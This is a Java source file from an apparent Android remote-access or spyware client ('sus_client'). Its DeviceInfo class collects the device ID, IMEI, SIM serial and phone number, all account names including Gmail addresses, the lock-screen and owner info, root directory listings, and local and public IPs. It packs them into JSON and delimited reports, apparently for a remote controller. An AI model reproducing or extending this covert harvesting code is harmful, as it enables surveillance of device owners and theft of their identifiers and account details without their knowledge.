package com.android.sus_client.utils.phoneutils;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.usage.StorageStatsManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.storage.StorageManager;
import android.os.storage.StorageVolume;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Formatter;

import com.android.sus_client.annotation.RequiresApi;
import com.android.sus_client.commonutility.root.RootCommands;
import com.android.sus_client.utils.ViewUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class DeviceInfo implements Serializable {

    public String deviceId;
    public String deviceName;
    public String deviceNameUser;
    public String androidVersion;
    public String appVersion;
    public long appInstallTime;
    public long appUpdateTime;
    public long connectionTime;
    public String screenStatus;
    public int powerState;
    public boolean isCharging;
    public double freeDiskStorage;
    public double totalDiskCapacity;

    public SystemInfo systemInfo;
    public SimInfo simInfo;
    public List<Account> deviceAccounts;
    public List<FileDirectoryInfo> fileDirectories;

    public DeviceInfo(Context context) {
        systemInfo = new SystemInfo();
        simInfo = getSimInfo(context);
        deviceAccounts = getDeviceAccounts(context);
        fileDirectories = getFileDirectories(context);

        deviceId = getDeviceID(context);
        deviceName = getDeviceName();
        deviceNameUser = getDeviceNameUser(context);
        androidVersion = systemInfo.release;

        PackageInfo pi = getPackageInfo(context);
        appVersion = (pi != null) ? (pi.versionCode + " (" + pi.versionName + ")") : "Unknown";
        appInstallTime = (pi != null) ? pi.firstInstallTime : 0;
        appUpdateTime = (pi != null) ? pi.lastUpdateTime : 0;
        connectionTime = new Date().getTime();
        screenStatus = getScreenStatus(context);

        Intent intent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        powerState = getBatteryPercentage(intent);
        isCharging = getBatteryIsCharging(intent);
        freeDiskStorage = getFreeDiskStorage();
        totalDiskCapacity = getTotalDiskCapacity();
    }

    public JSONObject toJSON(String lastLocation, JSONArray ipAddressList) throws JSONException {
        JSONObject json = new JSONObject();
        json.put("deviceId", deviceId);
        json.put("deviceName", deviceName);
        json.put("deviceNameUser", deviceNameUser);
        json.put("androidVersion", androidVersion);
        json.put("appVersion", appVersion);
        json.put("appInstallTime", appInstallTime);
        json.put("appUpdateTime", appUpdateTime);
        json.put("connectionTime", connectionTime);
        json.put("screenStatus", screenStatus);
        json.put("powerState", powerState);
        json.put("isCharging", isCharging);
        json.put("freeDiskStorage", freeDiskStorage);
        json.put("totalDiskCapacity", totalDiskCapacity);
        json.put("systemInfo", systemInfo.toJSON());
        json.put("simInfo", simInfo.toJSON());
        json.put("lastLocation", lastLocation);

        JSONArray deviceAccountsArray = new JSONArray();
        for (int i = 0; i < deviceAccounts.size(); i++) {
            Account acc = deviceAccounts.get(i);
            deviceAccountsArray.put(new JSONObject().put("name", acc.name).put("type", acc.type));
        }
        json.put("deviceAccounts", deviceAccountsArray);

        JSONArray fileDirectoriesArray = new JSONArray();
        for (int i = 0; i < fileDirectories.size(); i++) {
            fileDirectoriesArray.put(fileDirectories.get(i).toJSON());
        }
        json.put("fileDirectories", fileDirectoriesArray);
        json.put("ipAddressList", ipAddressList);
        return json;
    }

    /**
     * For device info parameters
     */
    @SuppressLint("HardwareIds")
    public static String getDeviceID(Context context) {
        String deviceID = "";
        try {
            deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Error | Exception error) {
            deviceID = Build.SERIAL;
            if (deviceID == null || deviceID.trim().isEmpty() || deviceID.equals("unknown")) {
                deviceID = "model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + System.currentTimeMillis();
            }
        }
        return deviceID;
    }

    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        String release = Build.VERSION.RELEASE;
        if (model.startsWith(manufacturer)) {
            return model + " " + release;
        } else {
            return manufacturer + " " + model + " " + release;
        }
    }

    public static String getDeviceNameUser(Context context) {
        ContentResolver resolver = context.getContentResolver();
        String name = null;
        try {
            name = Settings.System.getString(resolver, "bluetooth_name");
        } catch (Exception ignored) {
        }
        try {
            if (name == null || name.trim().isEmpty()) {
                name = Settings.Secure.getString(resolver, "bluetooth_name");
            }
        } catch (Exception ignored) {
        }
        try {
            if (name == null || name.trim().isEmpty()) {
                name = Settings.System.getString(resolver, "device_name");
            }
        } catch (Exception ignored) {
        }
        try {
            if (name == null || name.trim().isEmpty()) {
                name = Settings.Secure.getString(resolver, "lock_screen_owner_info");
            }
        } catch (Exception ignored) {
        }
        try {
            if (name == null || name.trim().isEmpty()) {
                //if (ViewUtils.checkSelfPermission(context, Manifest.permission.BLUETOOTH_CONNECT) == PackageManager.PERMISSION_GRANTED) {
                name = BluetoothAdapter.getDefaultAdapter().getName();
                //}
            }
        } catch (Exception ignored) {
        }

        if (name == null || name.trim().isEmpty()) {
            name = getDeviceName();
        }
        return name;
    }

    /**
     * File Manager use case
     */
    public static List<FileDirectoryInfo> getFileDirectories(Context context) {
        FileDirectoryInfo rootDir = getFileDirectoryInternally(new File("/"), "Root Directory");
        FileDirectoryInfo applicationDir = getFileDirectoryInternally(new File(context.getApplicationInfo().dataDir), "Application Directory");
        FileDirectoryInfo storageDir = getFileDirectoryInternally(Environment.getExternalStorageDirectory(), "Storage Directory");
        List<FileDirectoryInfo> dirs = new ArrayList<>();
        if (rootDir != null) dirs.add(rootDir);
        if (applicationDir != null) dirs.add(applicationDir);
        if (storageDir != null) dirs.add(storageDir);
        return dirs;
    }

    private static FileDirectoryInfo getFileDirectoryInternally(File directory, String dirType) {
        try {
            String filePath = directory.getAbsolutePath();
            if (filePath.equals("/")) {
                String[] rootFiles = RootCommands.getRootDir();
                FileDirectoryInfo file = new FileDirectoryInfo();
                file.filePath = filePath;
                file.lastModified = 0;
                file.items = (rootFiles == null ? 0 : rootFiles.length);
                file.dirType = dirType;
                return file;

            } else {
                if (directory.canRead() && directory.isDirectory()) {
                    File[] files = directory.listFiles();
                    FileDirectoryInfo file = new FileDirectoryInfo();
                    file.filePath = filePath;
                    file.lastModified = directory.lastModified();
                    file.items = (files == null ? 0 : files.length);
                    file.dirType = dirType;
                    return file;
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    /**
     * Sim Info
     */
    public static SimInfo getSimInfo(Context context) {
        TelephonyManager tm = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
        SimInfo simInfo = new SimInfo();
        simInfo.sim = tm.getNetworkOperatorName();
        simInfo.simOperator = tm.getSimOperatorName();
        simInfo.simCountryIso = tm.getSimCountryIso();
        try {
            simInfo.simSerialNumber = tm.getSimSerialNumber();
            simInfo.imei = tm.getImei();
        } catch (Exception ignored) {
        }

        if (ViewUtils.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ViewUtils.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED && ViewUtils.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            simInfo.simLine1Number = tm.getLine1Number();
        }
        return simInfo;
    }

    public static List<Account> getDeviceAccounts(Context context) {
        Account[] accounts = AccountManager.get(context).getAccounts();
        return new ArrayList<>(Arrays.asList(accounts));
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static ArrayList<Long> getInternalMemory(Context context) {
        StorageManager storageManager = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);
        StorageStatsManager storageStatsManager = (StorageStatsManager) context.getSystemService(Context.STORAGE_STATS_SERVICE);

        if (storageManager == null || storageStatsManager == null) {
            return null;
        }

        ArrayList<Long> values = new ArrayList<>();
        List<StorageVolume> storageVolumes = storageManager.getStorageVolumes();
        for (StorageVolume sVolume : storageVolumes) {
            String uuidStr = sVolume.getUuid();
            UUID uuid;
            if (uuidStr == null) {
                uuid = StorageManager.UUID_DEFAULT;
            } else {
                uuid = UUID.fromString(uuidStr);
            }

            try {
                long freeInternalStorage = storageStatsManager.getFreeBytes(uuid);
                long totalInternalStorage = storageStatsManager.getTotalBytes(uuid);
                values.add(freeInternalStorage);
                values.add(totalInternalStorage);
                return values;
            } catch (Exception e) {
                return null;
            }
        }
        return null;
    }

    public static String getTotalExternalMemory(Context context) {
        File[] files = ViewUtils.getExternalFilesDirs(context, null);

        String externalStorageState = Environment.getExternalStorageState();
        boolean isReadable = Environment.MEDIA_MOUNTED.equals(externalStorageState) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(externalStorageState);

        if (!isReadable) {
            return null;
        }

        if (files.length > 0) {
            StatFs stat = new StatFs(files[1].getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long totalExternalMemory = totalBlocks * blockSize;
            return Formatter.formatFileSize(context, totalExternalMemory);
        } else {
            return null;
        }
    }

    public static String getFreeExternalMemory(Context context) {
        File[] files = ViewUtils.getExternalFilesDirs(context, null);

        String externalStorageState = Environment.getExternalStorageState();
        boolean isReadable = Environment.MEDIA_MOUNTED.equals(externalStorageState) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(externalStorageState);

        if (!isReadable) {
            return null;
        }

        if (files.length > 0) {
            StatFs stat = new StatFs(files[1].getPath());
            long blockSize = stat.getBlockSizeLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            long freeExternalMemory = availableBlocks * blockSize;
            return Formatter.formatFileSize(context, freeExternalMemory);
        } else {
            return null;
        }
    }

    public static double getFreeDiskStorage() {
        try {
            StatFs rootDir = new StatFs(Environment.getRootDirectory().getAbsolutePath());
            StatFs dataDir = new StatFs(Environment.getDataDirectory().getAbsolutePath());

            Boolean intApiDeprecated = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2;
            long rootAvailableBlocks = getTotalAvailableBlocks(rootDir, intApiDeprecated);
            long rootBlockSize = getBlockSize(rootDir, intApiDeprecated);
            double rootFree = BigInteger.valueOf(rootAvailableBlocks).multiply(BigInteger.valueOf(rootBlockSize)).doubleValue();

            long dataAvailableBlocks = getTotalAvailableBlocks(dataDir, intApiDeprecated);
            long dataBlockSize = getBlockSize(dataDir, intApiDeprecated);
            double dataFree = BigInteger.valueOf(dataAvailableBlocks).multiply(BigInteger.valueOf(dataBlockSize)).doubleValue();

            return rootFree + dataFree;
        } catch (Exception e) {
            return -1;
        }
    }

    private static long getTotalAvailableBlocks(StatFs dir, Boolean intApiDeprecated) {
        return (intApiDeprecated ? dir.getAvailableBlocksLong() : dir.getAvailableBlocks());
    }

    private static long getBlockSize(StatFs dir, Boolean intApiDeprecated) {
        return (intApiDeprecated ? dir.getBlockSizeLong() : dir.getBlockSize());
    }

    public static double getTotalDiskCapacity() {
        try {
            StatFs rootDir = new StatFs(Environment.getRootDirectory().getAbsolutePath());
            StatFs dataDir = new StatFs(Environment.getDataDirectory().getAbsolutePath());

            BigInteger rootDirCapacity = getDirTotalCapacity(rootDir);
            BigInteger dataDirCapacity = getDirTotalCapacity(dataDir);

            return rootDirCapacity.add(dataDirCapacity).doubleValue();
        } catch (Exception e) {
            return -1;
        }
    }

    private static BigInteger getDirTotalCapacity(StatFs dir) {
        boolean intApiDeprecated = Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2;
        long blockCount = intApiDeprecated ? dir.getBlockCountLong() : dir.getBlockCount();
        long blockSize = intApiDeprecated ? dir.getBlockSizeLong() : dir.getBlockSize();
        return BigInteger.valueOf(blockCount).multiply(BigInteger.valueOf(blockSize));
    }

    private static PackageInfo getPackageInfo(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
        } catch (Exception ignored) {
            return null;
        }
    }

    public static int getBatteryPercentage(Intent intent) {
        if (intent == null) {
            return 0;
        }

        int batteryLevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int batteryScale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        float level = (batteryLevel / (float) batteryScale) * 100;
        return Math.round(level);
    }

    public static boolean getBatteryIsCharging(Intent intent) {
        if (intent == null) {
            return false;
        }
        int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        return (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
    }

    public static String getScreenStatus(Context context) {
        try {
            KeyguardManager myKM = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            boolean isPhoneLocked = myKM.inKeyguardRestrictedInputMode();
            String strPhoneLocked = (isPhoneLocked) ? "LOCKED" : "UNLOCKED";

            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            boolean isScreenAwake = (int) Build.VERSION.SDK_INT < 20 ? powerManager.isScreenOn() : powerManager.isInteractive();
            String strScreenAwake = isScreenAwake ? "SCREEN ON" : "SCREEN OFF";

            return strPhoneLocked + " & " + strScreenAwake;
        } catch (Exception e) {
            return "An error occurred.&An error occurred.";
        }
    }

    /**
     * Helper methods
     */
    public static JSONObject getPublicIPAddressAsJson(boolean universalIp) {
        final String ipAddress = getPublicIPAddress(universalIp);
        final JSONObject json = new JSONObject();
        try {
            json.put("host", TextUtils.isEmpty(ipAddress) ? "" : ipAddress);
            json.put("interfaceName", universalIp ? "Universal" : "IPv4");
            json.put("displayName", "Internet IP");
            json.put("loopback", false);
        } catch (JSONException ignored) {
        }
        return json;
    }

    public static String getPublicIPAddress(Boolean universalIp) {
        String value = null;
        ExecutorService es = Executors.newSingleThreadExecutor();
        Future<String> result = es.submit(new Callable<String>() {
            public String call() throws Exception {
                try {
                    URL url = new URL(universalIp ? "https://api64.ipify.org/" : "https://api.ipify.org/");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    int responseCode = connection.getResponseCode();
                    if (responseCode != 200) {
                        throw new Exception("Failed to get public IP address: " + responseCode);
                    }
                    BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String ipAddress = reader.readLine();
                    connection.disconnect();
                    return ipAddress;
                } catch (IOException ignored) {
                }
                return null;
            }
        });
        try {
            value = result.get();
        } catch (Exception e) {
            // failed
        }
        es.shutdown();
        return value;
    }


    public static JSONArray getIPAddressList() {
        JSONArray ipAddressList = new JSONArray();
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            while (ifaces.hasMoreElements()) {
                NetworkInterface iface = ifaces.nextElement();
                String ifaceDispName = iface.getDisplayName();
                String ifaceName = iface.getName();
                Enumeration<InetAddress> inetAddrs = iface.getInetAddresses();
                while (inetAddrs.hasMoreElements()) {
                    InetAddress inetAddr = inetAddrs.nextElement();
                    final String hostAddr = inetAddr.getHostAddress();
                    if (inetAddr.isLoopbackAddress()) {
                        continue;
                    }
                    if (inetAddr.isAnyLocalAddress()) {
                        continue;
                    }
                    if (hostAddr != null && hostAddr.contains("::")) {
                        // Don't include the raw encoded names. Just the raw IP addresses. Skipping IPv6 address
                        continue;
                    }

                    JSONObject json = new JSONObject();
                    try {
                        json.put("host", hostAddr);
                        json.put("interfaceName", ifaceName);
                        json.put("displayName", ifaceDispName);
                        json.put("loopback", inetAddr.isLoopbackAddress());
                    } catch (JSONException ignored) {
                    }
                    ipAddressList.put(json);
                }
            }
        } catch (SocketException ignored) {
        }
        try {
            ipAddressList.put(getPublicIPAddressAsJson(true));
            ipAddressList.put(getPublicIPAddressAsJson(false));
        } catch (Exception ignored) {
        }
        return ipAddressList;
    }


    /**
     * Extras helper methods
     */

    public static String releaseNames() {
        String[] versionNames = new String[]{"ANDROID BASE", "ANDROID BASE 1.1", "CUPCAKE", "DONUT", "ECLAIR", "ECLAIR_0_1", "ECLAIR_MR1", "FROYO", "GINGERBREAD", "GINGERBREAD_MR1", "HONEYCOMB", "HONEYCOMB_MR1", "HONEYCOMB_MR2", "ICE_CREAM_SANDWICH", "ICE_CREAM_SANDWICH_MR1", "JELLY_BEAN", "JELLY_BEAN", "JELLY_BEAN", "KITKAT", "KITKAT", "LOLLIPOOP", "LOLLIPOOP_MR1", "MARSHMALLOW", "NOUGAT", "NOUGAT", "OREO", "OREO", "ANDROID PIE", "ANDROID Q", "Red Velvet Cake".toUpperCase()};
        try {
            int nameIndex = Build.VERSION.SDK_INT - 1;
            if (nameIndex < versionNames.length) {
                return versionNames[nameIndex];
            }
            return "Unknown";
        } catch (Exception e) {
            return "Unknown";
        }
    }

    public static String TXT_SEPARATOR = "<##>";

    public static String fetchAllInfo(Context context) {
        StringBuilder sb = new StringBuilder();
        sb.append(TXT_SEPARATOR + "------------[User Accounts Info]------------" + TXT_SEPARATOR);
        try {
            Account[] accounts = AccountManager.get(context).getAccounts();
            for (Account account : accounts) {
                String ac = "Type: " + account.type + "\n" + TXT_SEPARATOR + "Address: " + account.name + "\n" + TXT_SEPARATOR;
                sb.append(ac);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        sb.append(TXT_SEPARATOR + "------------[User Registered Gmail Account]------------" + TXT_SEPARATOR);
        try {
            Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
            for (Account account : accounts) {
                String ac = "Type: " + account.type + "\n" + TXT_SEPARATOR + "Address: " + account.name + "\n" + TXT_SEPARATOR;
                sb.append(ac);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        sb.append(TXT_SEPARATOR + "------------[Device Info]------------" + TXT_SEPARATOR);
        try {
            String deviceInfos = "" + "Device Name: " + getDeviceNameUser(context) + TXT_SEPARATOR + "Model: " + Build.MODEL + TXT_SEPARATOR + "Board: " + Build.BOARD + TXT_SEPARATOR + "Brand: " + Build.BRAND + TXT_SEPARATOR + "Bootloader: " + Build.BOOTLOADER + TXT_SEPARATOR + "Device: " + Build.DEVICE + TXT_SEPARATOR + "Display: " + Build.DISPLAY + TXT_SEPARATOR + "Fingerprint: " + Build.FINGERPRINT + TXT_SEPARATOR + "Hardware: " + Build.HARDWARE + TXT_SEPARATOR + "HOST: " + Build.HOST + TXT_SEPARATOR + "ID: " + Build.ID + TXT_SEPARATOR + "Manufacturer: " + Build.MANUFACTURER + TXT_SEPARATOR + "Product: " + Build.PRODUCT + TXT_SEPARATOR + "Tags: " + Build.TAGS + TXT_SEPARATOR + "User: " + Build.USER + TXT_SEPARATOR + "Time: " + new SimpleDateFormat("MMM d, yyyy, hh:mm:ss a", Locale.getDefault()).format(new Date()) + TXT_SEPARATOR;

            sb.append(deviceInfos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        sb.append(TXT_SEPARATOR + "------------[System info]------------" + TXT_SEPARATOR);
        try {
            String sysInfo = "Release: " + Build.VERSION.RELEASE + TXT_SEPARATOR + "SDK_INT: " + Build.VERSION.SDK_INT + TXT_SEPARATOR + "Language: " + Locale.getDefault().getLanguage() + TXT_SEPARATOR + "Time: " + new SimpleDateFormat("MMM d, yyyy, hh:mm:ss a", Locale.getDefault()).format(new Date()) + TXT_SEPARATOR;
            sb.append(sysInfo);
        } catch (Exception e) {
            e.printStackTrace();
        }

        sb.append(TXT_SEPARATOR + "------------[Sim Info]------------" + TXT_SEPARATOR);
        try {
            TelephonyManager tm = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE));
            String simInfo = "Sim: " + tm.getNetworkOperatorName() + TXT_SEPARATOR + "Sim Operator: " + tm.getSimOperatorName() + TXT_SEPARATOR + "Sim CountryIso: " + tm.getSimCountryIso() + TXT_SEPARATOR;
            // simInfo += "IMEI: " + tm.getImei() + TXT_SEPARATOR;
            // simInfo += "Sim Serial Number: " + tm.getSimSerialNumber() + TXT_SEPARATOR;
            if (ViewUtils.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ViewUtils.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED && ViewUtils.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                simInfo += "Line Number: " + tm.getLine1Number() + TXT_SEPARATOR;
            }
            sb.append(simInfo);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

}